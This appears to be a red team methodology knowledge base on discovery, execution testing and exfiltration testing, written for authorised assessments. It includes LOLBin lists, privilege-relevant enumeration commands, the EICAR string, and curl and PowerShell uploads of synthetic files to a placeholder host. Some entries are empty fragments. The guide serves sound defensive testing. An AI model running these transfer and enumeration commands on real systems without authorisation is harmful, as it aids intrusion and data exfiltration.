docs.title: Candidate vs Finding
docs.text:
Most discovery observations are not findings.

Examples:

Domain controller discovered

is architecture information.

Microsoft Defender present

is architecture information.

Internal route discovered

is architecture information.

A finding requires a security-relevant weakness.

docs.title: Example Finding - Excessive Network Reachability
docs.text:
Title:
User Workstations Can Directly Reach Administrative Server Network

Observation:
During post-compromise discovery, the assessment workstation was
found to have direct network reachability to the administrative
server segment.

Selected management services on authorised systems were reachable
from the standard workstation network.

Impact:
An attacker who compromises a normal user workstation may be able
to directly interact with higher-value server infrastructure,
increasing opportunities for credential-based lateral movement
and further compromise.

Recommendation:
Review network segmentation between workstation and administrative
server networks. Permit only explicitly required flows and monitor
administrative protocols crossing security zones.

docs.title: Example Finding - Excessive Information Exposure
docs.text:
Title:
Application Configuration Exposes Internal Infrastructure Details

Observation:
A configuration file accessible to the standard assessment user
contained internal server names, service endpoints and environment
information.

No credential material was required to demonstrate the issue.

Impact:
The information significantly reduces the discovery effort
required after initial compromise and provides an attacker with
direct knowledge of internal application dependencies.

Recommendation:
Restrict access to sensitive configuration information and remove
unnecessary infrastructure details from files accessible to
standard users.

docs.title: Running Everything Immediately
docs.text:
Avoid:

Run every enumeration tool

Scan every subnet

Query every AD object

Enumerate every share

Start with context and expand only when justified.

docs.title: Treating Information as Vulnerability
docs.text:
Example:

Domain Admins group exists

is not a vulnerability.

docs.title: Ignoring Existing Connections
docs.text:
Existing connections can be more useful than scanning.

They reveal systems the host already communicates with.

docs.title: Ignoring Routes
docs.text: Routes often explain where the host can reach and whether pivoting may be possible.

docs.title: Ignoring DNS
docs.text:
Internal DNS can reveal:

Domains

Domain controllers

Application servers

Management systems

Service records

docs.title: Ignoring Security Controls
docs.text: Knowing which controls are active is necessary to correctly interpret later execution and detection results.

docs.title: Over-Collecting
docs.text:
Do not collect:

Entire user profiles

All documents

All shares

All browser data

Every domain object

unless specifically required and authorised.

docs.title: Trusting Automated Enumeration Blindly
docs.text:
Automated tools produce candidates.

Always validate important observations manually.

docs.title: Automated Discovery Tools
docs.text:
Tools commonly used in authorised assessments include:

BloodHound

Each can generate substantial telemetry and output.

docs.title: Core Principle
docs.text:
Discovery can be reduced to:

Understand where you are.

Understand who you are.

Understand what privilege you have.

Understand the host.

Understand the network.

Understand identity.

Understand the domain.

Understand applications.

Understand defensive controls.

Identify security boundaries.

Identify candidate attack paths.

Validate scope before expanding.

Prefer existing context over unnecessary scanning.

Collect only what supports the objective.

Record important observations.

Use discovery to decide what to test next.

Discovery should answer a question

Before running a discovery command or tool, know what question it is intended to answer. If the result will not change the attack-path decision, the activity may not be necessary.

Discovery is not permission expansion

An internal hostname, subnet, domain, cloud resource, share, or administrative system becoming visible from a compromised host does not automatically bring that resource into scope. Revalidate the Rules of Engagement before expanding active testing.

docs.title: Red Team Execution
docs.text:
Execution is the stage where an attacker causes code, commands, scripts, or applications to run on a target system.

Within an authorised red team assessment, execution testing should answer:

What can execute?

Under which identity?

With which privileges?

From which locations?

Which interpreters are available?

Which application-control policies apply?

Which endpoint controls inspect execution?

What telemetry is generated?

Is suspicious execution detected?

Can defenders reconstruct what happened?

Execution should not be treated as:

Payload runs = security control bypassed

Instead, evaluate the complete control path:

Execution Attempt
      |
      v
Application Control
      |
      v
Endpoint Prevention
      |
      v
Execution
      |
      v
Telemetry
      |
      v
Detection
      |
      v
Response

Authorised testing only

Execute commands, scripts, binaries, and remote administration activity only on explicitly authorised systems. Prefer harmless validation artifacts and minimal-impact techniques when determining whether an execution boundary exists.

docs.title: Execution Objectives
docs.text:
Common objectives include:

Determine available execution mechanisms

Determine execution context

Identify interpreters

Identify application-control boundaries

Identify writable execution locations

Validate script-control policies

Validate endpoint prevention

Validate execution telemetry

Validate detection logic

Understand remote execution boundaries

Determine whether execution enables the next attack phase

docs.title: Execution Is a Security Boundary
docs.text:
The important question is not merely:

Can I run a command?

Ask:

What should this identity be allowed to execute?

What should be blocked?

Which locations are trusted?

Which binaries are permitted?

Which scripts are permitted?

Which interpreters are available?

Which controls enforce those decisions?

docs.title: Constrained Language Mode
docs.text:
PowerShell Constrained Language Mode, or CLM, restricts certain PowerShell capabilities.

Typical restrictions affect:

Arbitrary .NET type access

COM interaction

Type creation

Advanced scripting functionality

CLM is most useful when enforced as part of a broader application-control architecture.

docs.title: Safe CLM Validation
docs.text:
Check:

$ExecutionContext.SessionState.LanguageMode

A harmless restricted-operation test can help determine whether language restrictions are actually enforced.

For example:

Add-Type -TypeDefinition 'public class ExecutionControlTest { public static string Value = "test"; }'

Under a restricted language environment, this may be prevented.

The goal is to validate the boundary, not to bypass it.

These are different observations.

docs.title: Simple Windows Execution Test
docs.text:
A minimal command:

cmd.exe /c echo Execution test

PowerShell:

Write-Output "Execution test"

These establish basic command execution without introducing a payload.

docs.title: Process Creation
docs.text:
List processes:

Get-Process

Detailed process information:

Get-CimInstance Win32_Process |
    Select-Object ProcessId,ParentProcessId,Name,ExecutablePath

docs.title: Parent-Child Relationships
docs.text:
Execution often creates a process tree.

Example:

explorer.exe
    |
    v
powershell.exe
    |
    v
cmd.exe

Defenders frequently analyse parent-child relationships rather than individual process names alone.

docs.title: Process Tree Questions
docs.text:
Ask:

Who started the process?

What started it?

Which command line was used?

Which user executed it?

Was elevation involved?

Was the process signed?

Did it access the network?

Did it create additional processes?

docs.title: Windows Event 4688
docs.text:
If process creation auditing is enabled, Windows Security Event ID 4688 can record process creation.

Defenders may observe:

New process name

Creator process

Account

Process ID

Command line

Command-line availability depends on auditing configuration.

docs.title: Process Creation Audit Policy
docs.text:
Review relevant audit configuration:

auditpol /get /subcategory:"Process Creation"

This helps determine whether process execution should be visible in the Security log.

docs.title: Sysmon
docs.text:
Sysmon can provide additional process telemetry when deployed.

Common useful telemetry includes:

Process creation

Network connections

Image loading

File creation

Registry modification

DNS activity

Sysmon Event ID 1 represents process creation.

docs.title: Windows Defender
docs.text:
Check Microsoft Defender status:

Get-MpComputerStatus

Useful fields:

Get-MpComputerStatus |
    Select-Object AntivirusEnabled,
                  RealTimeProtectionEnabled,
                  BehaviorMonitorEnabled,
                  IoavProtectionEnabled,
                  AntispywareEnabled

docs.title: Defender Version
docs.text:
Get-MpComputerStatus |
    Select-Object AMEngineVersion,
                  AMProductVersion,
                  AntivirusSignatureVersion,
                  AntivirusSignatureLastUpdated

docs.title: EICAR Validation
docs.text:
The EICAR test file is designed to validate antivirus detection without using real malware.

Canonical EICAR test string:

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

Create the test artifact:

$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "$env:TEMP\eicar.com.txt" -Value $eicar -NoNewline

Expected behaviour depends on endpoint configuration.

Possible outcomes:

Creation blocked

File quarantined

Detection generated

Alert generated

File remains but detection recorded

docs.title: Review Defender Detection
docs.text:
Get-MpThreatDetection

Also review:

Applications and Services Logs
    |
    Microsoft
        |
        Windows
            |
            Windows Defender
                |
                Operational

docs.title: Defender Event Log
docs.text:
PowerShell:

Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 30

Review events around the test timestamp.

docs.title: EICAR Interpretation
docs.text:
If EICAR is blocked:

Antivirus signature validation succeeded.

It does not prove:

Every malicious technique will be blocked.

Likewise, if a behavioural simulation executes, that does not automatically prove the endpoint product has been bypassed.

docs.title: AMSI
docs.text:
The Antimalware Scan Interface provides an interface through which applications can submit content to antimalware products for inspection.

AMSI commonly applies to environments such as:

PowerShell

Windows Script Host

JavaScript

VBScript

Other integrated applications

docs.title: AMSI Model
docs.text:
Script Content
      |
      v
Script Host
      |
      v
AMSI
      |
      v
Antimalware Provider
      |
      v
Allow / Detect / Block

docs.title: AMSI Validation
docs.text:
The objective should be to determine:

Is AMSI-integrated inspection present?

Does suspicious test content generate telemetry?

Does endpoint security respond?

Are detections forwarded centrally?

A red team report should distinguish an AMSI control observation from a claim that AMSI itself was defeated.

docs.title: AMSI Bypass Assessment
docs.text:
During an authorised assessment, bypass resistance may be evaluated conceptually across areas such as:

AMSI integration

Script content inspection

Runtime protections

Application control

Behaviour monitoring

EDR telemetry

Detection engineering

Avoid treating one execution result as proof of a universal AMSI bypass.

docs.title: Application Control
docs.text:
Execution may be governed by:

AppLocker

Windows Defender Application Control

Software Restriction Policies

Endpoint security

Privilege-management products

docs.title: AppLocker
docs.text:
Check the effective AppLocker policy:

Get-AppLockerPolicy -Effective

Review collections:

(Get-AppLockerPolicy -Effective).RuleCollections |
    Select-Object CollectionType,EnforcementMode

Possible collections include:

Exe

Msi

Script

Dll

Appx

docs.title: AppLocker Enforcement
docs.text:
Possible enforcement modes include:

Enabled

AuditOnly

NotConfigured

An enabled collection does not necessarily mean every execution path is restricted.

docs.title: AppLocker Policy Details
docs.text:
Get-AppLockerPolicy -Effective -Xml

Review:

Path rules

Publisher rules

Hash rules

Exceptions

User/group scope

docs.title: Test-AppLockerPolicy
docs.text:
A useful safe validation mechanism is:

Get-AppLockerPolicy -Effective |
    Test-AppLockerPolicy -Path "$env:WINDIR\System32\wscript.exe" -User "$env:USERDOMAIN\$env:USERNAME"

Possible result:

Allowed

or:

Denied

docs.title: Test a Specific File
docs.text:
Get-AppLockerPolicy -Effective |
    Test-AppLockerPolicy -Path "C:\Path\To\Test.exe" -User "$env:USERDOMAIN\$env:USERNAME"

This checks the effective policy decision without requiring execution.

docs.title: AppLocker Path Rules
docs.text:
A rule such as:

%WINDIR%\*

allows files matching that path according to the rule's scope and collection.

The security question becomes:

Can a lower-privileged user modify locations covered by an
allow rule?

docs.title: Writable Trusted Locations
docs.text:
A potentially important control condition is:

Writable by Standard User
          +
Allowed by Application Control
          =
Potential Execution-Control Weakness

Both conditions should be validated.

docs.title: Test Directory Permissions
docs.text:
Example:

Get-Acl -LiteralPath "C:\ProgramData\CandidateFolder" |
    Format-List Owner,AccessToString

Do not assume a directory is writable solely because of its location.

docs.title: Safe Write Test
docs.text:
$folder = "C:\ProgramData\CandidateFolder"
$file = Join-Path $folder "write-test-$PID.tmp"

try {
    New-Item -ItemType File -Path $file -ErrorAction Stop | Out-Null
    Write-Output "Write succeeded"
}
finally {
    Remove-Item $file -Force -ErrorAction SilentlyContinue
}

This validates write access without introducing an executable payload.

docs.title: Application-Control Assessment
docs.text:
Candidate Path
      |
      v
User Writable?
   /      \
 No        Yes
 |          |
Stop        v
        Policy Allows?
         /       \
       No         Yes
       |           |
      Stop         v
             Safe Execution
               Validation
                   |
                   v
              Confirmed Gap?

docs.title: WDAC
docs.text:
Windows Defender Application Control is now generally described by Microsoft as App Control for Business.

It can control which:

Executables

DLLs

Scripts

Installers

Applications

are trusted to execute.

docs.title: Code Integrity Logs
docs.text:
Important logs include:

Microsoft-Windows-CodeIntegrity/Operational

Query:

Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 50

docs.title: Application Control Interpretation
docs.text:
Distinguish:

No policy exists

Policy exists in audit mode

Policy exists and allowed the file

Policy exists and blocked the file

Different rule collection applies

File was outside policy scope

docs.title: LOLBins
docs.text:
Living-off-the-land binaries are legitimate system utilities that can sometimes perform functionality useful during an attack.

Common Windows examples include:

PowerShell

cmd

rundll32

regsvr32

mshta

wscript

cscript

certutil

bitsadmin

msbuild

InstallUtil

schtasks

sc

Their presence alone is not a vulnerability.

docs.title: LOLBin Assessment Model
docs.text:
Binary Present
      |
      v
Allowed to Launch?
      |
      v
Relevant Functionality Available?
      |
      v
Security Boundary Crossed?
      |
      v
Telemetry Generated?
      |
      v
Detection?

docs.title: rundll32
docs.text:
Locate:

Get-Command rundll32.exe

A harmless functional validation:

& "$env:WINDIR\System32\rundll32.exe" "shell32.dll,Control_RunDLL" "main.cpl"

This demonstrates that rundll32.exe can invoke an expected Windows Control Panel function.

It does not prove arbitrary DLL execution or application-control bypass.

docs.title: Windows Script Host
docs.text:
Check:

Get-Command wscript.exe
Get-Command cscript.exe

Create a harmless test script:

'WScript.Echo "Execution test"' | Set-Content "$env:TEMP\wscript-test.vbs"

Evaluate policy:

Get-AppLockerPolicy -Effective |
    Test-AppLockerPolicy -Path "$env:TEMP\wscript-test.vbs" -User "$env:USERDOMAIN\$env:USERNAME"

Cleanup:

Remove-Item "$env:TEMP\wscript-test.vbs" -Force -ErrorAction SilentlyContinue

docs.title: mshta
docs.text:
Check availability:

Get-Command mshta.exe -ErrorAction SilentlyContinue

Evaluate whether application-control policy restricts it.

Do not equate:

Binary exists

with:

HTA execution is unrestricted.

docs.title: MSBuild
docs.text:
Check common framework locations:

Get-ChildItem "$env:WINDIR\Microsoft.NET\Framework*\*\MSBuild.exe" -ErrorAction SilentlyContinue

Modern installations may also provide MSBuild through Visual Studio or the .NET toolchain.

Assess:

Presence

Policy

User context

Logging

Endpoint visibility

docs.title: InstallUtil
docs.text:
Search:

Get-ChildItem "$env:WINDIR\Microsoft.NET\Framework*\*\InstallUtil.exe" -ErrorAction SilentlyContinue

Again:

Present != unrestricted execution

docs.title: certutil
docs.text:
Check:

Get-Command certutil.exe -ErrorAction SilentlyContinue

Legitimate certificate functionality makes certutil.exe a common administrative utility.

Defenders should focus on unusual behaviour and context rather than the filename alone.

docs.title: BITS
docs.text:
Check:

Get-Command bitsadmin.exe -ErrorAction SilentlyContinue

PowerShell BITS functionality may also exist:

Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue

docs.title: curl
docs.text:
Modern Windows installations may include:

Get-Command curl.exe -ErrorAction SilentlyContinue

Its availability means HTTP transfer functionality exists, not that a vulnerability exists.

docs.title: Script Execution
docs.text:
Script execution commonly involves:

PowerShell

Batch

VBScript

JavaScript

Python

Shell scripts

Evaluate each relevant interpreter separately.

docs.title: PowerShell Script Logging
docs.text:
Important PowerShell telemetry includes:

Script Block Logging

Module Logging

Transcription

Process Creation

AMSI

EDR telemetry

docs.title: Script Block Logging
docs.text:
Relevant policy location:

HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

Inspect:

Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue

docs.title: Module Logging
docs.text: Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue

docs.title: Transcription
docs.text: Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue

docs.title: PowerShell Operational Log
docs.text:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50

Important events can include script execution and engine activity depending on configuration.

docs.title: ASR Rules
docs.text:
Microsoft Defender Attack Surface Reduction rules can restrict behaviours frequently associated with attacks.

Review:

Get-MpPreference |
    Select-Object AttackSurfaceReductionRules_Ids,
                  AttackSurfaceReductionRules_Actions

Interpret the configured rule IDs using Microsoft's current ASR documentation.

docs.title: ASR States
docs.text:
Rules may operate in modes such as:

Disabled

Block

Audit

Warn

The exact numeric configuration should be interpreted using current Microsoft documentation.

docs.title: Execution Validation Matrix
docs.text:
Maintain a matrix:

Mechanism Present Policy Executes Telemetry Alert PowerShell Yes Allowed Yes Yes Yes cmd Yes Allowed Yes Yes No wscript Yes Restricted No Yes No mshta Yes Blocked No Yes Yes rundll32 Yes Allowed Yes Yes No

docs.title: Remote Execution
docs.text:
Execution may also occur remotely through authorised administration protocols.

Common Windows mechanisms include:

WinRM

SMB services

WMI

DCOM

RDP

Scheduled tasks

Remote service management

See:

Lateral Movement

docs.title: Remote Execution Model
docs.text:
Source Host
     |
     v
Authentication
     |
     v
Remote Protocol
     |
     v
Target Host
     |
     v
Process Execution

docs.title: Remote Execution Preconditions
docs.text:
Validate:

Network reachability

Authentication

Authorisation

Administrative rights

Firewall policy

Service availability

Application control

docs.title: WinRM
docs.text:
Check reachability from Windows:

Test-NetConnection TARGET -Port 5985

HTTPS WinRM:

Test-NetConnection TARGET -Port 5986

Reachability alone does not prove authentication or execution rights.

docs.title: SMB
docs.text:
Test-NetConnection TARGET -Port 445

Again:

TCP reachable != remote execution possible

docs.title: RDP
docs.text: Test-NetConnection TARGET -Port 3389

docs.title: WMI
docs.text:
Local WMI functionality:

Get-CimInstance Win32_OperatingSystem

Remote WMI execution requires additional authentication, authorisation, and network conditions.

docs.title: Scheduled Tasks
docs.text:
Enumerate:

Get-ScheduledTask

Detailed task information:

Get-ScheduledTask |
    Select-Object TaskName,TaskPath,State

Scheduled tasks can represent:

Legitimate automation

Execution mechanism

Persistence mechanism

Context determines the security significance.

docs.title: Services
docs.text:
Enumerate:

Get-Service

Service configuration:

Get-CimInstance Win32_Service |
    Select-Object Name,StartName,State,PathName

Services may be relevant to:

Privilege escalation

Persistence

Lateral movement

docs.title: Linux Execution
docs.text:
On Linux, begin with execution context.

id

whoami

hostname

uname -a

docs.title: Current Shell
docs.text:
echo "$SHELL"

Current process:

ps -p $$ -o pid,ppid,user,comm,args

docs.title: Available Shells
docs.text:
cat /etc/shells

Possible shells include:

/bin/sh

/bin/bash

/bin/zsh

/usr/bin/fish

docs.title: Command Availability
docs.text:
Use:

command -v bash
command -v sh
command -v python3
command -v perl
command -v ruby
command -v php
command -v gcc

Presence should be recorded separately from privilege and security impact.

docs.title: Simple Linux Execution
docs.text:
printf '%s\n' 'Execution test'

Create a harmless shell script:

cat > /tmp/execution-test.sh <<'EOF'
#!/bin/sh
printf '%s\n' 'Execution test'
EOF

Make executable:

chmod +x /tmp/execution-test.sh

Execute:

/tmp/execution-test.sh

Cleanup:

rm -f /tmp/execution-test.sh

docs.title: Linux Mount Options
docs.text:
Execution may be restricted by filesystem mount options.

Review:

findmnt

Look for:

noexec

nosuid

nodev

docs.title: noexec
docs.text:
A filesystem mounted with:

noexec

restricts direct execution of binaries from that filesystem.

Do not interpret noexec as a universal code-execution prevention mechanism.

It is one layer of filesystem policy.

docs.title: Linux Permissions
docs.text:
Review file permissions:

ls -la /path/to/file

Directory permissions:

namei -l /path/to/file

The ability to write a file and the ability to execute it are separate conditions.

docs.title: Linux Sudo
docs.text:
Review authorised sudo permissions:

sudo -l

This is important because execution through privileged commands may cross a privilege boundary.

See:

Linux Privilege Escalation

docs.title: Linux Capabilities
docs.text:
Review file capabilities:

getcap -r / 2>/dev/null

Capabilities may permit specific privileged operations without full root access.

docs.title: Linux SUID and SGID
docs.text:
Find SUID files:

find / -perm -4000 -type f 2>/dev/null

Find SGID files:

find / -perm -2000 -type f 2>/dev/null

The presence of SUID/SGID files is normal.

The question is whether a specific configuration creates an unintended privilege path.

docs.title: Linux Services
docs.text:
List running services:

systemctl --type=service --state=running

Inspect a service:

systemctl status SERVICE

Service execution context may matter for:

Privilege

Persistence

Writable configuration

Environment variables

Executable paths

docs.title: Linux Cron
docs.text:
Review:

cat /etc/crontab

ls -la /etc/cron.d/

User cron:

crontab -l

Scheduled execution should be analysed together with file ownership and permissions.

docs.title: Linux Audit Telemetry
docs.text:
Linux execution visibility may come from:

auditd

systemd journal

EDR

Shell logging

Process accounting

Container telemetry

SIEM agents

docs.title: systemd Journal
docs.text:
Example:

journalctl --since "10 minutes ago"

Service-specific:

journalctl -u SERVICE

docs.title: auditd
docs.text:
Check status where available:

systemctl status auditd

Rules:

auditctl -l

Read-only inspection is preferred during initial validation.

docs.title: Containers
docs.text:
Execution may occur inside:

Docker

Podman

Kubernetes containers

Always determine whether the shell is:

Host

Container

Virtual machine

docs.title: Container Identification
docs.text:
Useful indicators:

cat /proc/1/cgroup

test -f /.dockerenv && echo "Docker indicator present"

Container execution does not automatically imply host execution.

docs.title: Docker
docs.text:
Check:

docker version

Current containers:

docker ps

Only where the current user is authorised to access the Docker daemon.

docs.title: Execution Boundaries
docs.text:
Track boundaries explicitly.

Examples:

Browser -> Shell

User -> Interpreter

Interpreter -> Child Process

User-Writable Path -> Executable

Standard User -> Administrative Process

Workstation -> Remote Server

Container -> Host

8. More Intrusive Technique Only If Required

docs.title: Reporting Execution Findings
docs.text:
Good finding titles:

Application Control Permits Execution from User-Writable Directory

PowerShell Language Restrictions Are Not Enforced for Standard Users

Script Execution Is Allowed Without Central Security Telemetry

Remote Administrative Execution Is Insufficiently Restricted

Avoid:

PowerShell Bypass

rundll32 Vulnerability

MSBuild Exploit

unless those phrases precisely describe the validated condition.

docs.title: Example Finding
docs.text:
Title:
Application Control Permits Execution from User-Writable Directory

Severity:
High

Observation:
A standard user was able to create an executable artifact in a
directory writable by non-administrative users.

The effective application-control policy allowed execution from
the same location.

A harmless validation executable was successfully launched under
the standard-user context.

Impact:
An attacker who obtains code execution as a standard user may be
able to execute arbitrary tooling from a location trusted by the
application-control policy, reducing the effectiveness of the
execution-control boundary.

Recommendation:
Remove write access for standard users from trusted application
paths or replace broad path-based allow rules with appropriately
scoped publisher, signer, or managed application-control rules.

docs.title: Example CLM Observation
docs.text:
Title:
PowerShell Full Language Mode Available to Standard Users

Observation:
The assessment account operated in PowerShell FullLanguage mode.

Impact:
FullLanguage provides access to PowerShell capabilities that may
increase the functionality available to an attacker following
initial code execution.

The observation should be evaluated together with application
control, AMSI, endpoint protection, PowerShell logging, and user
privilege.

Recommendation:
Where appropriate for the environment, consider enforcing
PowerShell Constrained Language Mode through a supported
application-control architecture for non-administrative users,
while ensuring administrative workflows remain functional.

docs.title: Example Detection Finding
docs.text:
Title:
PowerShell Execution Generates Telemetry but No Actionable Alert

Observation:
The controlled execution test generated PowerShell and endpoint
process telemetry.

The telemetry was successfully forwarded to the central security
platform.

No detection rule generated an alert during the assessment
window.

Classification:
Detection logic gap.

Recommendation:
Develop and tune detection logic around suspicious PowerShell
execution patterns while maintaining sufficient context to avoid
alerting on normal administrative use.

Detection engineering

docs.title: Core Principle
docs.text:
Execution testing can be reduced to:

Determine the current identity.

Determine the current privilege.

Identify available execution mechanisms.

Understand application-control policy.

Check script restrictions.

Check endpoint security.

Use the least intrusive validation.

Separate presence from permission.

Separate execution from privilege escalation.

Separate execution from control bypass.

Determine what telemetry was generated.

Determine whether an alert was generated.

Determine whether defenders responded.

Preserve evidence.

Cleanup test artifacts.

Report the actual security boundary that was validated.

Validate the boundary, not the payload

If a harmless executable, script, or built-in command can demonstrate that an execution boundary is missing, there is usually no need to introduce a more intrusive payload. The security finding is the failed control boundary, not the sophistication of the code used to demonstrate it.

Execution does not automatically mean bypass

A command or process successfully executing does not prove that Defender, AMSI, AppLocker, WDAC, ASR, or an EDR product was bypassed. Determine which control was expected to prevent the action, whether that control was actually configured and applicable, what telemetry was produced, and whether detection or response occurred before describing the result as a security-control failure.

docs.title: Red Team Exfiltration
docs.text:
Exfiltration is the process of transferring information from a target environment to another location.

In a real intrusion, adversaries may attempt to remove:

Documents

Credentials

Source code

Database records

Email

Intellectual property

Customer information

Backups

Cloud data

In an authorised red team assessment, the objective should normally be different:

Can an attacker who reaches the objective system move controlled
test information across the organisation's security boundary?

The safest model is:

Objective Reached
      |
      v
Synthetic Data
      |
      v
Controlled Staging
      |
      v
Approved Egress Channel
      |
      v
Controlled Destination
      |
      v
Detection Validation
      |
      v
Evidence
      |
      v
Cleanup

Authorised testing only

Exfiltration testing can move information outside organisational trust boundaries. Use synthetic or explicitly approved test data, customer-approved destinations, defined transfer limits and documented stop conditions. Do not transfer real sensitive information merely to prove that an egress path exists.

docs.title: Exfiltration Objectives
docs.text:
Typical objectives include:

Validate outbound network controls

Validate proxy controls

Validate firewall egress restrictions

Validate DNS monitoring

Validate DLP

Validate cloud-upload controls

Validate endpoint telemetry

Validate SIEM visibility

Validate SOC response

Demonstrate an attack path to the final objective

docs.text:

      |

      |

Discovery

docs.title: Collection vs Exfiltration
docs.text:
Collection answers:

Can the attacker access objective-relevant information?

Exfiltration answers:

Can controlled information cross an intended security boundary?

These should be separate decisions.

See:

Collection

docs.title: Exfiltration Does Not Require Real Data
docs.text:
A common mistake is assuming that exfiltration must involve production information.

It usually does not.

A safer test is:

Generate Synthetic File
        |
        v
Record Hash and Size
        |
        v
Transfer File
        |
        v
Verify Destination
        |
        v
Compare Hash
        |
        v
Check Detection

This proves the technical path without exposing production data.

docs.title: Synthetic Exfiltration Data
docs.text:
Suitable test data can include:

Random bytes

Generated text

Dummy CSV records

Customer-provided marker files

EICAR only when testing malware controls separately

Generated archives

Synthetic documents

Do not place real credentials or personal information inside synthetic test files.

docs.title: Linux Synthetic File
docs.text:
Create a 1 MB random test file:

dd if=/dev/urandom of=redteam-exfil-test.bin bs=1M count=1 status=progress

Record size:

stat -c '%n %s bytes' redteam-exfil-test.bin

Hash:

sha256sum redteam-exfil-test.bin

docs.title: Windows Synthetic File
docs.text:
Create a 1 MB synthetic file:

$data = New-Object byte[] (1MB)
[System.Security.Cryptography.RandomNumberGenerator]::Fill($data)
[System.IO.File]::WriteAllBytes("C:\RedTeamStaging\redteam-exfil-test.bin", $data)

Record metadata:

Get-Item "C:\RedTeamStaging\redteam-exfil-test.bin" |
    Select-Object Name,Length,LastWriteTime

Hash:

Get-FileHash -Algorithm SHA256 "C:\RedTeamStaging\redteam-exfil-test.bin"

docs.title: Text-Based Synthetic Dataset
docs.text:
Example:

RecordID,CustomerName,Classification
RT-0001,Synthetic User 1,TEST
RT-0002,Synthetic User 2,TEST
RT-0003,Synthetic User 3,TEST

Save it as:

redteam-synthetic-data.csv

This can be useful when testing content-aware controls.

docs.title: Customer-Provided Markers
docs.text:
An organisation can provide:

redteam-objective.txt

redteam-dlp-test.docx

redteam-finance-test.csv

redteam-classified-test.pdf

The content can be intentionally designed for:

DLP testing

Classification testing

Proxy testing

Cloud upload testing

SOC validation

docs.title: Exfiltration Planning
docs.text:
Before testing, determine:

What is being transferred?

How large is it?

Where does it originate?

Where will it go?

Which protocol is authorised?

Which destination is authorised?

Which security boundary is being tested?

Which controls should observe it?

What is the maximum transfer volume?

What are the stop conditions?

docs.text:
Example:

Test ID:
EXFIL-003

Source:
APP01

Identity:

Data:

Protocol:
HTTPS

Destination:
Authorised red team server

Expected Controls:
Firewall
Proxy
EDR
DLP
SIEM

Maximum Transfer:
5 MB

Stop Condition:
Unexpected production data observed

docs.title: Destination Control
docs.text:
The receiving system should be:

Owned by the red team

Owned by the customer

Explicitly approved

Access controlled

Logged

Temporary where appropriate

Do not use:

Random public upload services

Personal cloud accounts

Unapproved file-sharing services

Third-party systems outside the engagement

docs.title: Egress Validation Before Transfer
docs.text:
Before transferring data, validate basic connectivity.

Windows:

Test-NetConnection example.com -Port 443

Linux:

nc -vz example.com 443

Use only the authorised destination.

docs.title: DNS Resolution
docs.text:
Windows:

Resolve-DnsName example.com

Linux:

dig example.com

or:

getent hosts example.com

docs.title: Proxy Discovery
docs.text:
Many organisations require outbound web traffic through a proxy.

Windows WinHTTP proxy:

netsh winhttp show proxy

PowerShell environment variables:

Get-ChildItem Env: |
    Where-Object Name -Match 'proxy'

Linux:

env | grep -i proxy

docs.title: HTTP and HTTPS
docs.text:
Web protocols are common egress channels because organisations frequently permit outbound web access.

For an authorised synthetic transfer, the objective is to determine:

Can the host connect?

Does a proxy mediate the request?

Is the destination restricted?

Is the upload permitted?

Does DLP inspect the content?

Does the SOC receive useful telemetry?

docs.title: HTTPS Synthetic Upload with curl
docs.text:
For a customer-controlled upload endpoint designed for the engagement:

curl --fail --show-error --upload-file redteam-exfil-test.bin https://example.com/redteam-upload/redteam-exfil-test.bin

The destination must be explicitly authorised.

docs.title: Windows curl
docs.text:
Modern Windows installations may include curl.exe.

Check:

Get-Command curl.exe -ErrorAction SilentlyContinue

An approved upload can use:

curl.exe --fail --show-error --upload-file "C:\RedTeamStaging\redteam-exfil-test.bin" "https://example.com/redteam-upload/redteam-exfil-test.bin"

docs.title: PowerShell HTTP Upload
docs.text:
For a customer-controlled endpoint that accepts an HTTP PUT:

Invoke-WebRequest -Uri "https://example.com/redteam-upload/redteam-exfil-test.bin" -Method Put -InFile "C:\RedTeamStaging\redteam-exfil-test.bin"

Do not send real customer data to an external destination.

docs.text:

Source host

Source identity

Destination

Protocol

Timestamp

SHA-256

Detection result

docs.text:
At the receiving system, record:

sha256sum redteam-exfil-test.bin

Source SHA-256

docs.title: HTTP Status
docs.text:
Record the HTTP status where available.

Possible outcomes include:

200 - Accepted

201 - Created

204 - Accepted without response body

403 - Blocked

407 - Proxy authentication required

413 - Payload too large

Interpret the result according to the receiving application.

docs.title: HTTPS Inspection
docs.text:
An organisation may perform TLS inspection.

Relevant questions include:

Was the TLS connection intercepted?

Could DLP inspect the content?

Was the destination categorised?

Was the upload logged?

Did the proxy identify the user?

Do not attempt to bypass TLS inspection merely to make the transfer succeed.

docs.title: Proxy-Control Validation
docs.text:
A useful validation sequence is:

Direct Egress?
     |
     v
Proxy Required?
     |
     v
Authorised Destination
     |
     v
Upload Attempt
     |
     v
Proxy Log
     |
     v
DLP / SIEM

docs.title: Direct vs Proxy Egress
docs.text:
Record whether traffic:

Leaves directly

Uses explicit proxy

Uses transparent proxy

Is blocked

Requires authentication

Unexpected direct internet access from restricted server networks can itself be an important finding.

docs.title: DNS Exfiltration
docs.text:
DNS can theoretically carry small amounts of encoded information through DNS queries.

For red team testing, avoid transmitting real data through DNS.

A safer validation is to use a synthetic identifier.

Example concept:

Synthetic Marker
      |
      v
DNS Query
      |
      v
Authoritative Test Domain
      |
      v
DNS Logs
      |
      v
Detection

docs.title: DNS Marker Validation
docs.text:
For an engagement-controlled domain:

dig exfil-test-001.example.com

Windows:

Resolve-DnsName exfil-test-001.example.com

This validates:

DNS resolution path

Resolver visibility

Authoritative DNS visibility

Potential SOC visibility

without transmitting sensitive information.

docs.title: DNS Detection Questions
docs.text:
Determine:

Which resolver received the request?

Was the query logged?

Was the querying host identifiable?

Was the user identifiable?

